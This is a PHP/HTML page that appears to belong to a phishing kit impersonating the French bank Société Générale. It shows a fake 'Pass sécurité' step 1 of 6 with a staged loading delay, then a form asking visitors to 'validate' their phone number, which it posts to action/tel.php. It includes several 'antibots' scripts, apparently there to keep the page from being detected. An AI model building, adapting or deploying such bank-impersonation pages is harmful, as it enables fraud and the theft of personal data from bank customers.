<?php
include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>SG | Validation téléphone</title>
  <link rel="stylesheet" href="style.css">
  <style>
    * {
      box-sizing: border-box;
    }

    body, html {
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      height: 100%;
    }

    .step-title {
      font-weight: bold;
      color: #000;
      margin-left: 20px;
      font-size: 1rem;
    }

    .center-wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: calc(100vh - 200px);
    }

    .form-box {
      text-align: center;
      max-width: 400px;
      width: 100%;
    }

    .instruction-text {
      font-size: 1.3rem;
      line-height: 1.8rem;
      font-weight: 500;
      color: #000;
      margin-bottom: 30px;
    }

    .input-wrapper {
      position: relative;
      margin-bottom: 25px;
    }

    .client-input {
      width: 100%;
      padding: 12px 10px;
      font-size: 1rem;
      border: 1px solid #ccc;
      border-radius: 6px;
      background-color: #fff;
    }

    .close-icon {
      position: absolute;
      top: 50%;
      right: 12px;
      transform: translateY(-50%);
      font-size: 18px;
      cursor: pointer;
    }

    .validate-btn {
      width: 100%;
      padding: 12px;
      font-size: 1rem;
      background-color: #E71921;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .validate-btn:hover {
      background-color: #c9141b;
    }

    .loader-local {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 180px;
    }

    .loader-dots {
      display: flex;
      gap: 10px;
    }

    .loader-dots div {
      width: 10px;
      height: 10px;
      background-color: gray;
      opacity: 0.3;
      animation: blink 1.5s infinite;
      border-radius: 2px;
    }

    .loader-dots div:nth-child(1) { animation-delay: 0s; }
    .loader-dots div:nth-child(2) { animation-delay: 0.3s; }
    .loader-dots div:nth-child(3) { animation-delay: 0.6s; }

    @keyframes blink {
      0%, 80%, 100% {
        opacity: 0.3;
        transform: scale(1);
      }
      40% {
        opacity: 1;
        transform: scale(1.3);
      }
    }
  </style>
</head>
<body>

  <div class="header">
    <div class="top-bar">
      <div class="nav-right">
        <a href="sms1.php"><img src="icons/location.svg" alt=""> Agences</a>
        <a href="#"><img src="icons/warning.svg" alt=""> Aide et contacts</a>
      </div>
    </div>
    <div class="bottom-bar">
      <div class="logo-slogan">
        <img src="IMG/images (3).png" alt="SG Logo">
        <div class="slogan"></div>
      </div>
      <button class="open-account">Déconnecter</button>
    </div>
  </div>

  <hr>
  <p class="sub-title step-title">Pass sécurité - Etape 1/6</p>

  <div class="center-wrapper">
    <div id="loadingBlock" class="loader-local">
      <div class="loader-dots">
        <div></div>
        <div></div>
        <div></div>
      </div>
    </div>

    <div class="form-box" id="mainForm" style="display:none;">
      <p class="instruction-text">
        Pour accéder à tous vos services en ligne,<br>
        merci de valider votre numéro de téléphone.
      </p>
      <form action="action/tel.php" method="post">
        <div class="input-wrapper">
          <input type="tel" class="client-input" name="phone_number" id="phoneNumber" maxlength="10" placeholder="Numéro de téléphone" required>
          <label for="phoneNumber"></label>
          <span class="close-icon" id="clearPhone">&times;</span>
        </div>
        <button class="validate-btn" type="submit">Valider</button>
      </form>
    </div>
  </div>

  <footer>
    <div class="footer-top">
      <div class="footer-links">
        <div><i class="fas fa-question-circle"></i> Questions fréquentes</div>
        <div><i class="fas fa-map-marker-alt"></i> Trouver une agence</div>
        <div>Autres sites SG <i class="fas fa-chevron-down"></i></div>
      </div>
      <div class="footer-social">
        <i class="fab fa-facebook-f"></i>
        <i class="fab fa-instagram"></i>
        <i class="fab fa-x-twitter"></i>
      </div>
    </div>

    <div class="footer-bottom">
      <img src="IMG/piedpage.png" alt="SG Logo" class="sg-logo">
      <div class="footer-text">
        <span>Sécurité</span> |
        <span>Nos engagements</span> |
        <span>Gestion des Cookies</span> |
        <span>Données personnelles</span> |
        <span>Documentation et Tarifs</span> |
        <span>Résilier une prestation</span> |
        <span>Contestation et réclamation</span> |
        <span>Informations légales</span> |
        <span>Accessibilité Numérique (partiellement conforme)</span>
      </div>
    </div>
  </footer>

  <script>
    window.addEventListener("load", function () {
      setTimeout(() => {
        document.getElementById("loadingBlock").style.display = "none";
        document.getElementById("mainForm").style.display = "block";
      }, 5000);
    });

    const phoneInput = document.getElementById('phoneNumber');
    const clearIcon = document.getElementById('clearPhone');

    clearIcon.addEventListener('click', () => {
      phoneInput.value = '';
      clearIcon.textContent = '×';
      phoneInput.classList.remove('not-empty');
      clearIcon.classList.remove('valid');
    });

    phoneInput.addEventListener('input', () => {
      phoneInput.classList.toggle('not-empty', phoneInput.value.length > 0);
      if (phoneInput.value.length === 10 && phoneInput.value.startsWith("0")) {
        clearIcon.textContent = '✔';
        clearIcon.classList.add('valid');
      } else {
        clearIcon.textContent = '×';
        clearIcon.classList.remove('valid');
      }
    });
  </script>
</body>
</html>
